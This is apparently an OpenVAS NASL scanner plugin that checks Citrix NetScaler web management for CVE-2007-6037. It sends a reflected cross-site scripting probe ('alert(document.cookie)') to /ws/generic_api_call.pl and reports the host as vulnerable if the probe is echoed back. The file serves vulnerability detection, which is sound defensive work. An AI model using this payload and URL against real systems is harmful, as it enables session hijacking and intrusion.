# OpenVAS Vulnerability Test
# $Id: netscaler_web_xss.nasl 8384 2018-01-12 02:32:15Z ckuersteiner $
# Description: NetScaler web management XSS
#
# Authors:
# nnposter
#
# Copyright:
# Copyright (C) 2007 nnposter
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80027");
  script_version("$Revision: 8384 $");
  script_tag(name:"last_modification", value:"$Date: 2018-01-12 03:32:15 +0100 (Fri, 12 Jan 2018) $");
  script_tag(name:"creation_date", value:"2008-10-24 20:15:31 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_name("NetScaler web management XSS");

  script_family("Web application abuses");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");

  script_cve_id("CVE-2007-6037");
  script_bugtraq_id(26491);
  script_xref(name:"OSVDB", value:"39009");

  script_copyright("This script is Copyright (c) 2007 nnposter");
  script_dependencies("netscaler_web_detect.nasl");
  script_require_keys("citrix_netscaler/http/detected");
  script_require_ports("Services/www",80);

  script_tag(name: "solution", value: "Unknown at this time.");

  script_tag(name: "summary", value: "The remote web server is prone to cross-site scripting attacks. 

Description :

The remote Citrix NetScaler web management interface is susceptible to cross-site scripting attacks.");

  script_xref(name: "URL", value: "http://www.securityfocus.com/archive/1/483920/100/0/threaded");

  exit(0);
}

include("url_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("citrix_netscaler/http/port");
if (!port || !get_tcp_port_state(port))
  exit(0);

xss = "</script><script>alert(document.cookie)</script><script>";
url = "/ws/generic_api_call.pl?function=statns&standalone=" + urlencode(str:xss);

resp = http_keepalive_send_recv(port: port, data: http_get(item: url,port: port), embedded:TRUE);
if (!resp || xss >!< resp)
  exit(99);

report = "The following URLs have been found vulnerable :\n\n" +
         ereg_replace(string:url,pattern:"\?.*$",replace:"");

security_message(port: port, data: report);

exit(0);
